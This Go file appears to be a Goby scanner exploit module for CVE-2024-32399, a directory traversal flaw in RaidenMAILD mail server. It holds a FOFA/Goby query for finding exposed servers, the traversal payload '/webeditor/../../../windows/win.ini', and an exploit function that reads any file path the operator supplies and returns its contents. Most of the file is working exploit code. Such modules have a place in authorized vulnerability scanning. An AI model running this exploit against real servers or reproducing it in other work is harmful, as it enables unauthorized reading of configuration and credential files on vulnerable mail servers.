package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "RaidenMAILD /webeditor Directory Traversal Vulnerability(CVE-2024-32399)",
    "Description": "<p>The directory traversal vulnerability in RaidenMAILD Mail Server versions 4.9.4 and earlier allows remote attackers to obtain sensitive information through the /webeditor/ component.</p>",
    "Product": "RAIDEN-Mail-Server",
    "Homepage": "http://www.raidenmaild.com/",
    "DisclosureDate": "2024-05-11",
    "PostTime": "2024-10-09",
    "Author": "2987612621@qq.com",
    "FofaQuery": "((body=\"RaidenMAILD\" && body=\"Web Mail\") || (body=\"RaidenMAILD\" && body=\"Remote Control\"))",
    "GobyQuery": "((body=\"RaidenMAILD\" && body=\"Web Mail\") || (body=\"RaidenMAILD\" && body=\"Remote Control\"))",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.raidenmaild.com/\">http://www.raidenmaild.com/</a></p><p> 2. Set access policies and whitelist access through security devices such as firewalls.</p><p> 3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://cloud.tencent.com/developer/article/2417452"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "ini,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "../../../windows/win.ini",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/webeditor/../../../windows/win.ini",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "for 16-bit app support",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "VulType": [
        "Directory Traversal"
    ],
    "CVEIDs": [
        "CVE-2024-32399"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "RaidenMAILD /webeditor 目录遍历漏洞（CVE-2024-32399）",
            "Product": "RAIDEN-邮件服务器",
            "Description": "<p>RaidenMAILD Mail Server 4.9.4及之前版本中的目录遍历漏洞使远程攻击者能够通过/webeditor/组件获取敏感信息。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.raidenmaild.com/\">http://www.raidenmaild.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "RaidenMAILD /webeditor Directory Traversal Vulnerability(CVE-2024-32399)",
            "Product": "RAIDEN-Mail-Server",
            "Description": "<p>The directory traversal vulnerability in RaidenMAILD Mail Server versions 4.9.4 and earlier allows remote attackers to obtain sensitive information through the /webeditor/ component.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.raidenmaild.com/\">http://www.raidenmaild.com/</a></p><p>&nbsp;2. Set access policies and whitelist access through security devices such as firewalls.</p><p>&nbsp;3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9959"
}`

postOrGet_dsaiol := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
  respTxt := ""
  // 注意：返回值为（最终要返回的读取结果，错误）
  requestConfig := httpclient.NewGetRequestConfig("/webeditor/" + fileUrl)
  requestConfig.VerifyTls = false
  requestConfig.FollowRedirect = false
  resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
  if err != nil || resp.StatusCode != 200 {
    err = errors.New("failed to read file")
    return "", err
  }
  respTxt = resp.RawBody
  return respTxt, nil
}

ExpManager.AddExploit(NewExploit(
  goutils.GetFileName(),
  expJson,
  func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
    // 此处需要修改：设置成功后的vulurl
    vulURL := "/webeditor/../../../windows/win.ini"
    // 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
    defaultModeMap := map[string]string{
      "../../../windows/win.ini": "for 16-bit app support",
    }
    // 函数继承
    uploadFileFunc := postOrGet_dsaiol

    // 请注意：后续代码为模板代码，非特殊情况，无需更改
    // ----------------------------------------------------------------------------------------------------------------------------------------------------
    for fileUrl, fileText := range defaultModeMap {
      resp, err := uploadFileFunc(u, fileUrl)
      if err != nil {
        continue
      }
      if strings.Contains(resp, fileText) {
        // 设置VULURL
        ss.VulURL = u.HostInfo + vulURL
        return true
      }
    }
    return false
  },

  func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
    var fileUrl string
    var fileText string
    mode := goutils.B2S(ss.Params["mode"])

    // 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
    defaultModeMap := map[string][2]string{
      "ini": {"../../../windows/win.ini", "for 16-bit app support"},
    }
    // 此处需要修改：函数继承
    uploadFileFunc := postOrGet_dsaiol

    // 请注意，后续代码为模板固化，正常情况下均无需修改
    // ----------------------------------------------------------------------------------------------------------------------------------------------------
    if mode == "Customize" {
      fileUrl = goutils.B2S(ss.Params["Customize"])
    } else {
      if _, ok := defaultModeMap[mode]; ok {
        fileUrl = defaultModeMap[mode][0]
        fileText = defaultModeMap[mode][1]
      } else {
        expResult.Success = false
        return expResult
      }
    }

    // 获取返回结果url和返回请求头
    resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
    if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
      expResult.Success = false
      return expResult
    }

    expResult.Success = true
    expResult.Output = resp
    return expResult
  },
))
}